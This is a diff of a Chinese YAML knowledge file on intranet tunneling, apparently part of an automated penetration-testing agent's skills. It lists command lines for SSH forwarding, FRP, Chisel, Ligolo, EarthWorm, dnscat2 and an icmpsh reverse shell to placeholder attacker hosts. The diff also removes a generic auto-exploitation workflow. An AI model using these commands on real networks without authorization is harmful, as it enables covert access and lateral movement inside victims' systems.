@@ -1,189 +1,262 @@
-name: "隧道技术"
-description: "内网隧道和代理技术"
-domain: "intranet"
-version: "1.0"
+name: 隧道技术
+description: 内网隧道和代理技术
+domain: intranet
+version: '1.0'
 tags:
-  - intranet
-  - tunnel
-  - proxy
+- intranet
+- tunnel
+- proxy
+knowledge: '# 隧道代理
 
-knowledge: |
-  # 隧道代理
-  
+
   ## 1. SSH隧道
-  
+
+
   ### 本地端口转发
-  
+
+
   ```bash
+
   ssh -L 8080:127.0.0.1:80 user@target
+
   ssh -L 3389:target:3389 jump@jump_host
+
   ```
-  
+
+
   ### 远程端口转发
-  
+
+
   ```bash
+
   ssh -R 8080:127.0.0.1:80 user@target
+
   ```
-  
+
+
   ### 动态端口转发(SOCKS代理)
-  
+
+
   ```bash
+
   ssh -D 1080 user@target
+
   ```
-  
+
+
   ---
-  
+
+
   ## 2. FRP内网穿透
-  
+
+
   ### 服务端
-  
+
+
   ```bash
+
   ./frps -c frps.ini
+
   ```
-  
+
+
   ### 客户端
-  
+
+
   ```bash
+
   ./frpc -c frpc.ini
+
   ```
-  
+
+
   ---
-  
+
+
   ## 3. reGeorg
-  
+
+
   ```bash
+
   python reGeorg.py -u http://target.com/tunnel.aspx
+
   python reGeorg.py -u http://target.com/tunnel.aspx -p 8080
+
   ```
-  
+
+
   ---
-  
+
+
   ## 4. Chisel
-  
+
+
   ### 服务端
-  
+
+
   ```bash
+
   chisel server -p 8080 --reverse
+
   ```
-  
+
+
   ### 客户端
-  
+
+
   ```bash
+
   chisel client 10.0.0.1:8080 R:1080:socks
+
   ```
-  
+
+
   ---
-  
+
+
   ## 5. Ligolo
-  
+
+
   ### 服务端
-  
+
+
   ```bash
+
   ./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
+
   ```
-  
+
+
   ### 客户端
-  
+
+
   ```bash
+
   ./ligolo-ng_agent -connect 10.0.0.1:11601 -attempts 10 -delay 15 -selfcert
+
   ```
-  
+
+
   ---
-  
+
+
   ## 6. Venom
-  
+
+
   ### 节点模式
-  
+
+
   ```bash
+
   ./venom.exe -nodeport 9999
+
   ```
-  
+
+
   ### 代理模式
-  
+
+
   ```bash
+
   ./venom.exe -adminport 9998 -lhost 0.0.0.0
+
   ```
-  
+
+
   ---
-  
+
+
   ## 7. EW (EarthWorm)
-  
+
+
   ### 正向代理
-  
+
+
   ```bash
+
   ./ew -s ssocksd -l 1080
+
   ```
-  
+
+
   ### 反向代理
-  
+
+
   ```bash
+
   # 攻击者
+
   ./ew -s rcsocks -l 1080 -e 9999
-  
+
+
   # 目标
+
   ./ew -s rssocks -d attacker_ip -e 9999
+
   ```
-  
+
+
   ---
-  
+
+
   ## 8. DNS隧道
-  
+
+
   ### dnscat2
-  
+
+
   ```bash
+
   # 服务端
+
   ./dnscat2-server --secret=secret
-  
+
+
   # 客户端
+
   ./dnscat2 --secret=secret attacker.com
+
   ```
-  
+
+
   ---
-  
+
+
   ## 9. ICMP隧道
-  
+
+
   ### icmpsh
-  
+
+
   ```bash
+
   # 攻击者
+
   ./icmpsh_m.py attacker_ip target_ip
-  
+
+
   # 目标
+
   ./icmpsh -t attacker_ip -s 128
+
   ```
-  
+
+
   ---
-  
+
+
   ## 10. SOCKS代理
-  
+
+
   ### ProxyChains
-  
+
+
   ```bash
+
   proxychains nmap -sT target_ip
+
   proxychains4 nmap -sT target_ip
+
   ```
-  
 
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+  '
